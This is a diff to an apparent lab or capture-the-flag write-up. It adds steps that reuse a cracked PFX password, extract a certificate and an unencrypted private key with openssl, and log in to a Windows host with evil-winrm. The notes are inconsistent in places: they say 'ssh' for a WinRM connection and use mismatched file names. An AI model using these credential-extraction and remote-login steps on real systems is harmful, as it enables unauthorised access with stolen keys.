@@ -161,12 +161,25 @@ thuglegacy       (legacyy_dev_auth.pfx)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
+  Found pfx pass: thuglegacy
   
+  Now lets extract key and cert:
   
+  Extract cert:
    ```sh
-   openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.pem
+   openssl pkcs12 -in legacyy_dev_auth.pfx -out cert.pem
    ```
    
+   Extract priv key:
+   ``sh
+   openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.pem -nodes
+   ``
+   
+   After formatting the files correctly we can connect via ssh:
+   
+   ```sh
+   evil-winrm -S -k legacy.key -c legacy.cert -i 10.10.11.152
+   ``` 
    
   
 
